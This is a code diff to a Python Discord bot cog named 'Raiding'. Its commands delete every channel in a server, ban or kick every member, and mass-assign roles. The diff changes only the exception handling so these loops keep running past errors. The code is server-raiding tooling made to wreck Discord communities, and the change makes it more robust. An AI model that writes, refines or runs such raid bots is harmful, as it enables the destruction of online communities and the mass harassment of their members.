@@ -17,7 +17,7 @@ class Raiding(commands.Cog):
         for channel in ctx.guild.channels:
             try:
                 await channel.delete()
-            except:
+            except discord.HTTPException as e:
                 pass
 
         for i in range(50):
@@ -30,7 +30,9 @@ class Raiding(commands.Cog):
         for member in ctx.guild.members:
             try:
                 await member.ban()
-            except:
+            except discord.Forbidden:
+                pass
+            except discord.HTTPException as e:
                 pass
 
     @commands.command()
@@ -40,7 +42,9 @@ class Raiding(commands.Cog):
         for member in ctx.guild.members:
             try:
                 await member.kick()
-            except:
+            except discord.Forbidden:
+                pass
+            except discord.HTTPException as e:
                 pass
 
     @commands.command()
@@ -51,7 +55,9 @@ class Raiding(commands.Cog):
         for member in ctx.guild.members:
             try:
                 await member.add_roles(role)
-            except:
+            except discord.Forbidden:
+                pass
+            except discord.HTTPException as e:
                 pass
 
 def setup(bot):
